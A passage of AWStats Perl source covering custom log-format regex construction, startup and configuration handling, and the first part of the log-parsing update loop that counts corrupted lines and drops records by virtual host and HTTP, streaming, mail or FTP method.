                # %u (user) is "([^\\/\\[]+)" instead of "[^$LogSeparatorWithoutStar]+" 
                # because can contain space (Lotus Notes).
                $PerlParsingFormat .= "([^\\/\\[]+)";
            }elsif($f =~ /%time1$/ || $f =~ /%time1b$/){ 
                # Date format
                # [dd/mmm/yyyy:hh:mm:ss +0000] or [dd/mmm/yyyy:hh:mm:ss],
                # time1b kept for backward compatibility
                $pos_date = $i;
                $i++;
                push @fieldlib, 'date';
                $pos_tz = $i;
                $i++;
                push @fieldlib, 'tz';
                $PerlParsingFormat .= "\\[([^$LogSeparatorWithoutStar]+)([^$LogSeparatorWithoutStar]+)?\\]";
            }elsif($f =~ /%time2$/){
                # yyyy-mm-dd hh:mm:ss
                $pos_date = $i;
                $i++;
                push @fieldlib, 'date';
                # Need \s for Exchange log files
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+\\s[^$LogSeparatorWithoutStar]+)";                        
            }elsif($f =~ /%time3$/){
                # mon d hh:mm:ss  or  mon  d hh:mm:ss  or  mon dd hh:mm:ss yyyy  
                # or  day mon dd hh:mm:ss  or  day mon dd hh:mm:ss yyyy
                $pos_date = $i;
                $i++;
                push @fieldlib, 'date';
                $PerlParsingFormat .= "(?:\\w\\w\\w)?(\\w\\w\\w \\s?\\d+ \\d\\d:\\d\\d:\\d\\d(?: \\d\\d\\d\\d)?)";
            }elsif($f =~ /%time4$/){
                # ddddddddddddd
                $pos_date = $i;
                $i++;
                push @fieldlib, 'date';
                $PerlParsingFormat .= "(\\d+)";
            }elsif($f =~ /%methodurl$/){
                # Special for methodurl and methodurlnoprot
                $pos_method = $i;
                $i++;
                push @fieldlib, 'method';
                $pos_url = $i;
                $i++;
                push @fieldlib, 'url';
                #"\\\"([^$LogSeparatorWithoutStar]+) ([^$LogSeparatorWithoutStar]+) [^\\\"]+\\\"";
                $PerlParsingFormat .= "\\\"([^$LogSeparatorWithoutStar]+) ".
                                      "([^$LogSeparatorWithoutStar]+)(?: [^\\\"]+|)\\\"";
            }elsif($f =~ /%methodurlnoprot$/){
                $pos_method = $i;
                $i++;
                push @fieldlib, 'method';
                $pos_url = $i;
                $i++;
                push @fieldlib, 'url';
                $PerlParsingFormat .= "\\\"([^$LogSeparatorWithoutStar]+) ([^$LogSeparatorWithoutStar]+)\\\"";
            }elsif($f =~ /%virtualnamequot$/){
                # Common command tags
                $pos_vh = $i;
                $i++;
                push @fieldlib, 'vhost';
                $PerlParsingFormat .= "\\\"([^$LogSeparatorWithoutStar]+)\\\"";
            }elsif($f =~ /%virtualname$/){
                $pos_vh = $i;
                $i++;
                push @fieldlib, 'vhost';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }elsif($f =~ /%host_r$/){
                $pos_hostr = $i;
                $i++;
                push @fieldlib, 'hostr';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }elsif($f =~ /%host$/){
                $pos_host = $i;
                $i++;
                push @fieldlib, 'host';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }elsif($f =~ /%host_proxy$/){
                # if host_proxy tag used, host tag must not be used
                $pos_host = $i;
                $i++;
                push @fieldlib, 'host';
                $PerlParsingFormat .= "(.+?)(?:, .*)*";
            }elsif($f =~ /%method$/){
                $pos_method = $i;
                $i++;
                push @fieldlib, 'method';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }elsif($f =~ /%url$/){
                $pos_url = $i;
                $i++;
                push @fieldlib, 'url';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }elsif($f =~ /%query$/){
                $pos_query = $i;
                $i++;
                push @fieldlib, 'query';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }elsif($f =~ /%code$/){
                $pos_code = $i;
                $i++;
                push @fieldlib, 'code';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }elsif($f =~ /%bytesd$/){
                $pos_size = $i;
                $i++;
                push @fieldlib, 'size';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }elsif($f =~ /%refererquot$/){
                $pos_referer = $i;
                $i++;
                push @fieldlib, 'referer';
                $PerlParsingFormat .=
                  "\\\"([^\\\"]*)\\\"";    # referer might be ""
            }elsif($f =~ /%referer$/){
                $pos_referer = $i;
                $i++;
                push @fieldlib, 'referer';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }elsif($f =~ /%uaquot$/){
                $pos_agent = $i;
                $i++;
                push @fieldlib, 'ua';
                $PerlParsingFormat .= "\\\"([^\\\"]*)\\\"";    # ua might be ""
            }elsif($f =~ /%uabracket$/){
                $pos_agent = $i;
                $i++;
                push @fieldlib, 'ua';
                $PerlParsingFormat .= "\\\[([^\\\]]*)\\\]";    # ua might be []
            }elsif($f =~ /%ua$/){
                $pos_agent = $i;
                $i++;
                push @fieldlib, 'ua';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }elsif($f =~ /%gzipin$/){
                $pos_gzipin = $i;
                $i++;
                push @fieldlib, 'gzipin';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }elsif($f =~ /%gzipout/){
                # Compare $f to /%gzipout/ and not to /%gzipout$/ like other fields
                $pos_gzipout = $i;
                $i++;
                push @fieldlib, 'gzipout';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }elsif($f =~ /%gzipratio/){
                # Compare $f to /%gzipratio/ and not to /%gzipratio$/ like other fields
                $pos_compratio = $i;
                $i++;
                push @fieldlib, 'gzipratio';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }elsif($f =~ /%deflateratio/){
                # Compare $f to /%deflateratio/ and not to /%deflateratio$/ like other fields
                $pos_compratio = $i;
                $i++;
                push @fieldlib, 'deflateratio';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }elsif($f =~ /%email_r$/){
                $pos_emailr = $i;
                $i++;
                push @fieldlib, 'email_r';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }elsif($f =~ /%email$/){
                $pos_emails = $i;
                $i++;
                push @fieldlib, 'email';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }elsif($f =~ /%cluster$/){
                $pos_cluster = $i;
                $i++;
                push @fieldlib, 'clusternb';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }elsif($f =~ /%timetaken$/){
                $pos_timetaken = $i;
                $i++;
                push @fieldlib, 'timetaken';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }elsif($f =~ /%protocolmms$/){
                # Special for protocolmms, used for method if method not already found (for MMS)
                if($pos_method < 0){
                    $pos_method = $i;
                    $i++;
                    push @fieldlib, 'method';
                    $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
                }
            }elsif($f =~ /%codemms$/){
                # Special for codemms, used for code only if code not already found (for MMS)
                if($pos_code < 0){
                    $pos_code = $i;
                    $i++;
                    push @fieldlib, 'code';
                    $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
                }
            }elsif($f =~ /%extra(\d+)$/){
                # Extra tag
                $pos_extra[$1] = $i;
                $i++;
                push @fieldlib, "extra$1";
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }elsif($f =~ /%other$/){
                # Other tag
                $PerlParsingFormat .= "[^$LogSeparatorWithoutStar]+";
            }elsif($f =~ /%otherquot$/){
                $PerlParsingFormat .= "\\\"[^\\\"]*\\\"";
            }else{
                # Unknown tag (no parenthesis)
                $PerlParsingFormat .= "[^$LogSeparatorWithoutStar]+";
            }
        }
        if(!$PerlParsingFormat){
            error("No recognized format tag in personalized LogFormat string");
        }
    }
    if($pos_host < 0){
        error("Your personalized LogFormat does not include all fields required ".
              "by AWStats (Add \%host in your LogFormat string).");
    }
    if($pos_date < 0){
        error("Your personalized LogFormat does not include all fields required ".
              "by AWStats (Add \%time1 or \%time2 in your LogFormat string).");
    }
    if($pos_method < 0){
        error("Your personalized LogFormat does not include all fields required ".
              "by AWStats (Add \%methodurl or \%method in your LogFormat string).");
    }
    if($pos_url < 0){
        error("Your personalized LogFormat does not include all fields required ".
              "by AWStats (Add \%methodurl or \%url in your LogFormat string).");
    }
    if($pos_code < 0){
        error("Your personalized LogFormat does not include all fields required by ".
              "AWStats (Add \%code in your LogFormat string).");
    }
    #if($pos_size < 0){
    #    error("Your personalized LogFormat does not include all fields required by ".
    #          "AWStats (Add \%bytesd in your LogFormat string).");
    #    }
    $PerlParsingFormat = qr/^$PerlParsingFormat/;
}

#------------------------------------------------------------------------------
# MAIN
#------------------------------------------------------------------------------
($DIR  = $0) =~ s/([^\/\\]+)$//;
($PROG = $1) =~ s/\.([^\.]*)$//;
$Extension = $1;
$DIR ||= '.';
$DIR =~ s/([^\/\\])[\\\/]+$/$1/;

# Get current time (time when AWStats was started)
$starttime = time();
($nowsec, $nowmin, $nowhour, $nowday, $nowmonth, $nowyear, $nowwday, $nowyday)= localtime($starttime);
$nowweekofmonth = int($nowday / 7);
$nowweekofyear  = int(($nowyday - 1 + 6 - ($nowwday == 0 ? 6 : $nowwday - 1)) / 7) + 1;
if($nowweekofyear > 52){
    $nowweekofyear = 1;
}
$nowdaymod = $nowday % 7;
$nowwday++;
$nowns = Time::Local::timegm(0, 0, 0, $nowday, $nowmonth, $nowyear);
if($nowdaymod <= $nowwday){
    if(($nowwday != 7) || ($nowdaymod != 0)){
        $nowweekofmonth = $nowweekofmonth + 1;
    }
}
if($nowdaymod > $nowwday){
    $nowweekofmonth = $nowweekofmonth + 2;
}

# Change format of time variables
$nowweekofmonth = "0$nowweekofmonth";
if($nowweekofyear < 10){ $nowweekofyear = "0$nowweekofyear"; }
if($nowyear < 100){ $nowyear += 2000; }
else { $nowyear += 1900; }
$nowsmallyear = $nowyear;
$nowsmallyear =~ s/^..//;
if(++$nowmonth < 10) { $nowmonth = "0$nowmonth"; }
if($nowday < 10)     { $nowday   = "0$nowday";   }
if($nowhour < 10)    { $nowhour  = "0$nowhour";  }
if($nowmin < 10)     { $nowmin   = "0$nowmin";   }
if($nowsec < 10)     { $nowsec   = "0$nowsec";   }
$nowtime = int($nowyear . $nowmonth . $nowday . $nowhour . $nowmin . $nowsec);

# Get tomorrow time (will be used to discard some record with corrupted date (future date))
my ($tomorrowsec, $tomorrowmin,   $tomorrowhour, $tomorrowday,
    $tomorrowmonth,$tomorrowyear)= localtime($starttime + 86400);
if($tomorrowyear < 100){ $tomorrowyear += 2000; }
else { $tomorrowyear += 1900; }
if(++$tomorrowmonth < 10) { $tomorrowmonth = "0$tomorrowmonth"; }
if($tomorrowday < 10)     { $tomorrowday   = "0$tomorrowday";   }
if($tomorrowhour < 10)    { $tomorrowhour  = "0$tomorrowhour";  }
if($tomorrowmin < 10)     { $tomorrowmin   = "0$tomorrowmin";   }
if($tomorrowsec < 10)     { $tomorrowsec   = "0$tomorrowsec";   }
$tomorrowtime = int($tomorrowyear.$tomorrowmonth.$tomorrowday.$tomorrowhour.$tomorrowmin.$tomorrowsec);

# Parse input parameters and sanitize them for security reasons
# Prepare QueryString
$QueryString = '';
$DebugMessages = 1;
for(0 .. @ARGV - 1){
    # TODO Check if ARGV is in @AllowedArg
    if($QueryString){
        $QueryString .= '&amp;';
    }
    my $NewLinkParams = $ARGV[$_];
    $NewLinkParams =~ s/^-+//;
    $QueryString .= "$NewLinkParams";
}
# Remove all XSS vulnerabilities coming from AWStats parameters
$QueryString = CleanXSS($QueryString);

# Update with no report by default when run from command line
# Check year, month, day, hour parameters
$UpdateStats   = 1;
$HourRequired  = '';
$DayRequired   = '';
$MonthRequired = "$nowmonth";
$YearRequired  = "$nowyear";
if($QueryString =~ /config=([^&]+)/i){
    $SiteConfig = &Sanitize("$1");
}
if(!$SiteConfig){# Display help information
    &PrintCLIHelp();
    exit 2;
}

# Read config file (SiteConfig must be defined)
# Check and correct bad parameters
&Read_Config();
&Check_Config();

# Define frame name and correct variable for frames
if(!$FrameName){
    $FrameName = 'main';
}
if($FrameName ne 'index'){
    if($FrameName ne 'mainleft'){
        my %datatoload = ();
        my ($filedomains, $filemime, $filerobots, 
            $fileworms, $filebrowser, $fileos, $filese) = 
            ('domains',  'mime', 'robots',    'worms',
             'browsers', 'operating_systems', 'search_engines');
        if($LevelForBrowsersDetection eq 'allphones'){
            $filebrowser = 'browsers_phone';
        }
        if($UpdateStats){ # If update
            if($LevelForFileTypesDetection){
                $datatoload{$filemime} = 1;
            } # Only if need to filter on known extensions
            if($LevelForRobotsDetection){
                $datatoload{$filerobots} = 1;
            }                  # ua
            if($LevelForWormsDetection){
                $datatoload{$fileworms} = 1;
            }                  # url
            if($LevelForBrowsersDetection){
                $datatoload{$filebrowser} = 1;
            }                  # ua
            if($LevelForOSDetection){
                $datatoload{$fileos} = 1;
            }                  # ua
            if($LevelForRefererAnalyze){
                $datatoload{$filese} = 1;
            } # referer
            # if(...){$datatoload{'referer_spam'}=1;}
        }
        &Read_Ref_Data(keys %datatoload);
    }
    &Read_Plugins();
}

# Init other parameters
$NBOFLINESFORBENCHMARK--;
if(!$DirData || $DirData =~ /^\./){
    # If not defined or chosen to '.' value then DirData is current dir
    if(!$DirData || $DirData eq '.'){
        $DirData = "$DIR";
    }elsif($DIR && $DIR ne '.'){
        $DirData = "$DIR/$DirData";
    }
}
# If current dir not defined then we put it to '.'
$DirData ||= '.';
$DirData =~ s/[\\\/]+$//;

# Build ListOfYears list with all existing years
($lastyearbeforeupdate, $lastmonthbeforeupdate, $lastdaybeforeupdate,
 $lasthourbeforeupdate, $lastdatebeforeupdate) = (0, 0, 0, 0, 0);
my $datemask = '';
if($DatabaseBreak eq 'month'){
    $datemask = '(\d\d)(\d\d\d\d)';
}elsif($DatabaseBreak eq 'year'){
    $datemask = '(\d\d\d\d)';
}elsif($DatabaseBreak eq 'day'){
    $datemask = '(\d\d)(\d\d\d\d)(\d\d)';
}elsif($DatabaseBreak eq 'hour'){
    $datemask = '(\d\d)(\d\d\d\d)(\d\d)(\d\d)';
}

my $retval = opendir(DIR, "$DirData");
if(!$retval) {
    error("Failed to open directory $DirData : $!");
}
my $regfilesuffix = quotemeta($FileSuffix);
foreach (grep /^$PROG$datemask$regfilesuffix\.txt(|\.gz)$/i, file_filt sort readdir DIR){
    /^$PROG$datemask$regfilesuffix\.txt(|\.gz)$/i;
    if(!$ListOfYears{"$2"} || "$1" gt $ListOfYears{"$2"}){
        # ListOfYears contains max month found
        $ListOfYears{"$2"} = "$1";
    }
    my $rangestring = ($2 || "") . ($1 || "") . ($3 || "") . ($4 || "");
    if($rangestring gt $lastdatebeforeupdate){
        # We are on a new max for mask
        $lastyearbeforeupdate  = ($2 || "");
        $lastmonthbeforeupdate = ($1 || "");
        $lastdaybeforeupdate   = ($3 || "");
        $lasthourbeforeupdate  = ($4 || "");
        $lastdatebeforeupdate  = $rangestring;
    }
}
close DIR;

# If at least one file found, get value for LastLine
if($lastyearbeforeupdate){
    # Read 'general' section of last history file for LastLine
    &Read_History_With_TmpUpdate($lastyearbeforeupdate, $lastmonthbeforeupdate,
                                 $lastdaybeforeupdate, $lasthourbeforeupdate, 0, 0, "general");
}

# Warning if lastline in future
# Force LastLine
# Init vars
if($LastLine > ($nowtime + 20000)){
    warning("WARNING: LastLine parameter in history file is '$LastLine' ".
            "so in future. May be you need to correct manually the line ".
            "LastLine in some awstats*.$SiteConfig.conf files.");
}
if($QueryString =~ /lastline=(\d{14 })/i){
    $LastLine = $1;
}
&Init_HashArray();

#---------------------------------------------------------------------
# UPDATE PROCESS
#---------------------------------------------------------------------
my $lastlinenb         = 0;
my $lastlineoffset     = 0;
my $lastlineoffsetnext = 0;
if($UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft'){
    # Update only on index page or when not framed to avoid update twice
    my %MonthNum = (
           "Jan", "01", "jan", "01", "Feb", "02", "feb", "02", "Mar", "03",
           "mar", "03", "Apr", "04", "apr", "04", "May", "05", "may", "05",
           "Jun", "06", "jun", "06", "Jul", "07", "jul", "07", "Aug", "08",
           "aug", "08", "Sep", "09", "sep", "09", "Oct", "10", "oct", "10",
           "Nov", "11", "nov", "11", "Dec", "12", "dec", "12");
    # MonthNum must be in english because used to translate log date in apache log files
    print "Create/Update database for config \"$FileConfig\" by AWStats version $VERSION\n";
    print "From data in log file \"$LogFile\"...\n";

    my $lastprocessedyear  = $lastyearbeforeupdate  || 0;
    my $lastprocessedmonth = $lastmonthbeforeupdate || 0;
    my $lastprocessedday   = $lastdaybeforeupdate   || 0;
    my $lastprocessedhour  = $lasthourbeforeupdate  || 0;
    my $lastprocesseddate  = '';
    if($DatabaseBreak eq 'month'){
        $lastprocesseddate = sprintf("%04i%02i", $lastprocessedyear, $lastprocessedmonth);
    }elsif($DatabaseBreak eq 'year'){
        $lastprocesseddate = sprintf("%04i%", $lastprocessedyear);
    }elsif($DatabaseBreak eq 'day'){
        $lastprocesseddate = sprintf("%04i%02i%02i", $lastprocessedyear,
                                     $lastprocessedmonth, $lastprocessedday);
    }elsif($DatabaseBreak eq 'hour'){
        $lastprocesseddate = sprintf("%04i%02i%02i%02i", $lastprocessedyear, $lastprocessedmonth,
                                     $lastprocessedday,  $lastprocessedhour);
    }

    my @list = ();;
    # Init RobotsSearchIDOrder required for update process
    if($LevelForRobotsDetection >= 1){
        foreach (1 .. $LevelForRobotsDetection){
            push @list, "list$_";
        }
        push @list, "listgen"; # Always added
    }
    foreach my $key (@list){
        push @RobotsSearchIDOrder, @{"RobotsSearchIDOrder_$key"};
    }

    # Init SearchEnginesIDOrder required for update process
    @list = ();
    if($LevelForSearchEnginesDetection >= 1){
        foreach (1 .. $LevelForSearchEnginesDetection){
            push @list, "list$_";
        }
        push @list, "listgen"; # Always added
    }
    foreach my $key (@list){
        push @SearchEnginesSearchIDOrder, @{"SearchEnginesSearchIDOrder_$key"};
    }

    # Complete HostAliases array
    my $sitetoanalyze = quotemeta(lc($SiteDomain));
    if(!@HostAliases){
        warning("Warning: HostAliases parameter is not defined, ".
                "$PROG choose \"$SiteDomain localhost 127.0.0.1\".");
        push @HostAliases, qr/^$sitetoanalyze$/i;
        push @HostAliases, qr/^localhost$/i;
        push @HostAliases, qr/^127\.0\.0\.1$/i;
    }else{
        unshift @HostAliases, qr/^$sitetoanalyze$/i;
    } # Add SiteDomain as first value

    # Optimize arrays
    @HostAliases      = &OptimizeArray(\@HostAliases, 1);
    @SkipDNSLookupFor = &OptimizeArray(\@SkipDNSLookupFor, 1);
    @SkipHosts        = &OptimizeArray(\@SkipHosts, 1);
    @SkipReferrers    = &OptimizeArray(\@SkipReferrers, 1);
    @SkipUserAgents   = &OptimizeArray(\@SkipUserAgents, 1);
    @SkipFiles        = &OptimizeArray(\@SkipFiles, $URLNotCaseSensitive);
    @OnlyHosts        = &OptimizeArray(\@OnlyHosts, 1);
    @OnlyUsers        = &OptimizeArray(\@OnlyUsers, 1);
    @OnlyUserAgents   = &OptimizeArray(\@OnlyUserAgents, 1);
    @OnlyFiles        = &OptimizeArray(\@OnlyFiles, $URLNotCaseSensitive);
    @NotPageFiles     = &OptimizeArray(\@NotPageFiles, $URLNotCaseSensitive);

    # Precompile the regex search strings with qr
    @RobotsSearchIDOrder        = map {qr/$_/i} @RobotsSearchIDOrder;
    @WormsSearchIDOrder         = map {qr/$_/i} @WormsSearchIDOrder;
    @BrowsersSearchIDOrder      = map {qr/$_/i} @BrowsersSearchIDOrder;
    @OSSearchIDOrder            = map {qr/$_/i} @OSSearchIDOrder;
    @SearchEnginesSearchIDOrder = map {qr/$_/i} @SearchEnginesSearchIDOrder;
    my $miscquoted     = quotemeta("$MiscTrackerUrl");
    my $defquoted      = quotemeta("/$DefaultFile[0]");
    my $sitewithoutwww = lc($SiteDomain);
    $sitewithoutwww    =~ s/www\.//;
    $sitewithoutwww    = quotemeta($sitewithoutwww);

    # Define precompiled regex
    my $regmisc        = qr/^$miscquoted/;
    my $regfavico      = qr/\/favicon\.ico$/i;
    my $regrobot       = qr/\/robots\.txt$/i;
    my $regtruncanchor = qr/#(\w*)$/;
    my $regtruncurl    = qr/([$URLQuerySeparators])(.*)$/;
    my $regext         = qr/\.(\w{1,6})$/;
    my $regdefault;
    if($URLNotCaseSensitive){
        $regdefault = qr/$defquoted$/i;
    }else{
        $regdefault = qr/$defquoted$/;
    }
    my $regipv4           = qr/^\d{1,3 }\.\d{1,3 }\.\d{1,3 }\.\d{1,3 }$/;
    my $regipv4l          = qr/^::ffff:\d{1,3 }\.\d{1,3 }\.\d{1,3 }\.\d{1,3 }$/;
    my $regipv6           = qr/^[0-9A-F]*:/i;
    my $regvermsie        = qr/msie([+_ ]|)([\d\.]*)/i;
    my $regvernetscape    = qr/netscape.?\/([\d\.]*)/i;
    my $regverfirefox     = qr/firefox\/([\d\.]*)/i;
    my $regveropera       = qr/opera\/([\d\.]*)/i;
    my $regversafari      = qr/safari\/([\d\.]*)/i;
    my $regversafariver   = qr/version\/([\d\.]*)/i;
    my $regverchrome      = qr/chrome\/([\d\.]*)/i;
    my $regverkonqueror   = qr/konqueror\/([\d\.]*)/i;
    my $regversvn         = qr/svn\/([\d\.]*)/i;
    my $regvermozilla     = qr/mozilla(\/|)([\d\.]*)/i;
    my $regnotie          = qr/webtv|omniweb|opera/i;
    my $regnotnetscape    = qr/gecko|compatible|opera|galeon|safari|charon/i;
    my $regnotfirefox     = qr/flock/i;
    my $regnotsafari      = qr/android|arora|chrome|shiira/i;
    my $regreferer        = qr/^(\w+):\/\/([^\/:]+)(:\d+|)/;
    my $regreferernoquery = qr/^([^$URLQuerySeparators]+)/;
    my $reglocal          = qr/^(www\.|)$sitewithoutwww/i;
    my $regget            = qr/get|out/i;
    my $regsent           = qr/sent|put|in/i;

    # Define value of $pos_xxx, @fieldlib, $PerlParsingFormat
    &DefinePerlParsingFormat($LogFormat);

    # Load DNS Cache Files
    #------------------------------------------
    if($DNSLookup) {
        # Load with save into a second plugin file if plugin enabled
        # and second file not up to date. No use of FileSuffix
        &Read_DNS_Cache(\%MyDNSTable, "$DNSStaticCacheFile", "", 1);
        if($DNSLookup == 1){ # System DNS lookup required
            #if(!eval("use Socket;")){
            #    error("Failed to load perl module Socket.");
            #}
            #use Socket;
            # Load with no save into a second plugin file. Use FileSuffix
            &Read_DNS_Cache(\%TmpDNSLookup, "$DNSLastUpdateCacheFile", "$FileSuffix", 0);
        }
    }

    # Processing log
    #------------------------------------------
    if($EnableLockForUpdate){
        # Trap signals to remove lock
        # 2
        # $SIG{KILL } = \&SigHandler; # 9
        # $SIG{TERM } = \&SigHandler; # 15
        # Set AWStats update lock
        $SIG{INT } = \&SigHandler;   
        &Lock_Update(1);
    }

    # Open log file
    # Avoid premature EOF due to log files corrupted with \cZ or bin chars
    open(LOG, "$LogFile") || error("Couldn't open server log file \"$LogFile\" : $!");
    binmode LOG;

    # Define local variables for loop scan
    my @field               = ();
    my $counterforflushtest = 0;
    my $qualifdrop          = '';
    my $countedtraffic      = 0;

    # Reset chrono for benchmark (first call to GetDelaySinceStart)
    &GetDelaySinceStart(1);
    print "Phase 1 : First bypass old records, searching new record...\n";

    # Can we try a direct seek access in log ?
    my $line;
    if($LastLine && $LastLineNumber && $LastLineOffset && $LastLineChecksum){
        # Try a direct seek access to save time
        seek(LOG, $LastLineOffset, 0);
        if($line = <LOG>){
            chomp $line;
            $line =~ s/\r$//;
            @field = map(/$PerlParsingFormat/, $line);
            my $checksum = &CheckSum($line);

            if($checksum == $LastLineChecksum){
                print "Direct access after last parsed record (after line $LastLineNumber)\n";
                $lastlinenb         = $LastLineNumber;
                $lastlineoffset     = $LastLineOffset;
                $lastlineoffsetnext = tell LOG;
                $NewLinePhase       = 1;
            }else{
                print "Direct access to last remembered record has fallen on another record.\n".
                      "So searching new records from beginning of log file...\n";
                $lastlinenb         = 0;
                $lastlineoffset     = 0;
                $lastlineoffsetnext = 0;
                seek(LOG, 0, 0);
            }
        }else{
            print "Direct access to last remembered record is out of file.\n".
                  "So searching it from beginning of log file...\n";
            $lastlinenb         = 0;
            $lastlineoffset     = 0;
            $lastlineoffsetnext = 0;
            seek(LOG, 0, 0);
        }
    }else{
        # No try of direct seek access
        print "Searching new records from beginning of log file...\n";
        $lastlinenb         = 0;
        $lastlineoffset     = 0;
        $lastlineoffsetnext = 0;
    }

    # Loop on each log line
    while($line = <LOG>){
        # 20080525 BEGIN Patch to test if first char of 
        # $line = hex "00" then conclude corrupted with binary code
        my $FirstHexChar;
        $FirstHexChar = sprintf("%02X", ord(substr($line, 0, 1)));
        if($FirstHexChar eq '00'){
            $NbOfLinesCorrupted++;
            if($ShowCorrupted){
                print "Corrupted record line " . 
                      ($lastlinenb + $NbOfLinesParsed) . 
                      " (record starts with hex 00; binary code): $line\n";
            }
            if($NbOfLinesParsed >= $NbOfLinesForCorruptedLog
               && $NbOfLinesParsed == $NbOfLinesCorrupted){
                error("Format error", $line, $LogFile);
            } # Exit with format error
            next;
        } # 20080525 END

        chomp $line;
        $line =~ s/\r$//;
        if($UpdateFor && $NbOfLinesParsed >= $UpdateFor){
            last;
        }

        $NbOfLinesParsed++;
        $lastlineoffset     = $lastlineoffsetnext;
        $lastlineoffsetnext = tell LOG;
        if($ShowSteps){
            if((++$NbOfLinesShowsteps & $NBOFLINESFORBENCHMARK) == 0){
                my $delay = &GetDelaySinceStart(0);
                print "$NbOfLinesParsed lines processed (" .
                      ($delay > 0 ? $delay : 1000) . " ms, " .
                      int(1000 * $NbOfLinesShowsteps / ($delay > 0 ? $delay : 1000)) .
                      " lines/second)\n";
            }
        }
        if($LogFormat eq '2' && $line =~ /^#Fields:/){
            my @fixField = map(/^#Fields: (.*)/, $line);
            if($fixField[0] !~ /s-kernel-time/){
                &DefinePerlParsingFormat($fixField[0]);
            }
        }

        # Parse line record to get all required fields
        if(!(@field = map(/$PerlParsingFormat/, $line))){
            # see if the line is a comment, blank or corrupted
            if($line =~ /^#/ || $line =~ /^!/){
                $NbOfLinesComment++;
                if($ShowCorrupted){
                    print "Comment record line " .
                          ($lastlinenb + $NbOfLinesParsed) . ": $line\n";
                }
            }elsif($line =~ /^\s*$/){
                $NbOfLinesBlank++;
                if($ShowCorrupted){
                    print "Blank record line " .
                          ($lastlinenb + $NbOfLinesParsed) . "\n";
                }
            }else{
                 $NbOfLinesCorrupted++;
                 if($ShowCorrupted){
                 print "Corrupted record line " .
                       ($lastlinenb + $NbOfLinesParsed) . 
                       " (record format does not match LogFormat parameter): $line\n";
                 }
            }
            # Exit with format error
            if($NbOfLinesParsed >= $NbOfLinesForCorruptedLog
               && $NbOfLinesParsed == ($NbOfLinesCorrupted + $NbOfLinesComment + $NbOfLinesBlank)){
                error("Format error", $line, $LogFile);
            }
            # For test purpose only
            if($line =~ /^__end_of_file__/i){
                last;
            }
            next;
        }

        # Drop wrong virtual host name
        if($pos_vh >= 0 && $field[$pos_vh] !~ /^$SiteDomain$/i){
            my $skip = 1;
            foreach (@HostAliases){
                if($field[$pos_vh] =~ /$_/){
                    $skip = 0; last;
                }
            }
            if($skip){
                $NbOfLinesDropped++;
                if($ShowDropped){
                    print "Dropped record (virtual hostname '$field[$pos_vh]' does not match ".
                          "SiteDomain='$SiteDomain' nor HostAliases parameters): $line\n";
                }
                next;
            }
        }

        # Drop wrong method/protocol
        if($LogType ne 'M'){
            $field[$pos_url] =~ s/\s/%20/g;
        }
        if($LogType eq 'W' && ($field[$pos_method] eq 'GET'
           || $field[$pos_method] eq 'POST'
           || $field[$pos_method] eq 'HEAD'
           || $field[$pos_method] eq 'PROPFIND'
           || $field[$pos_method] eq 'CHECKOUT'
           || $field[$pos_method] eq 'LOCK'
           || $field[$pos_method] eq 'PROPPATCH'
           || $field[$pos_method] eq 'OPTIONS'
           || $field[$pos_method] eq 'MKACTIVITY'
           || $field[$pos_method] eq 'PUT'
           || $field[$pos_method] eq 'MERGE'
           || $field[$pos_method] eq 'DELETE'
           || $field[$pos_method] eq 'REPORT'
           || $field[$pos_method] eq 'MKCOL'
           || $field[$pos_method] eq 'COPY'
           || $field[$pos_method] eq 'RPC_IN_DATA'
           || $field[$pos_method] eq 'RPC_OUT_DATA'
           || $field[$pos_method] eq 'OK'
           || $field[$pos_method] eq 'ERR!'
           || $field[$pos_method] eq 'PRIV')){
            # HTTP request. Keep only GET, POST, HEAD, 
            # *OK* and ERR! for Webstar. Do not keep OPTIONS, TRACE
        }elsif(($LogType eq 'W' || $LogType eq 'S') && (uc($field[$pos_method]) eq 'GET'
               || uc($field[$pos_method]) eq 'MMS'  || uc($field[$pos_method]) eq 'RTSP'
               || uc($field[$pos_method]) eq 'HTTP' || uc($field[$pos_method]) eq 'RTP')){
            # Streaming request (windows media server, realmedia or darwin streaming server)
        }elsif($LogType eq 'M' && $field[$pos_method] eq 'SMTP'){
            # Mail request ('SMTP' for mail log with maillogconvert.pl preprocessor)
        }elsif($LogType eq 'F' && ($field[$pos_method] eq 'RETR'
              || $field[$pos_method] eq 'o' || $field[$pos_method] =~ /$regget/o)){
            # FTP GET request
        }elsif($LogType eq 'F' && ($field[$pos_method] eq 'STOR'
               || $field[$pos_method] eq 'i' || $field[$pos_method] =~ /$regsent/o)){
            # FTP SENT request
        }elsif($line =~ m/#Fields:/){
             # log #fields as comment
             $NbOfLinesComment++;
             next;            
        }else{
            $NbOfLinesDropped++;
            if($ShowDropped){
                print "Dropped record (method/protocol '$field[$pos_method]' ".
                      "not qualified when LogType=$LogType): $line\n";
            }
            next;
        }

        # " \t" is used instead of "\s" not known with tr
        # tr and split faster than @dateparts=split(/[\/\-:\s]/,$field[$pos_date])
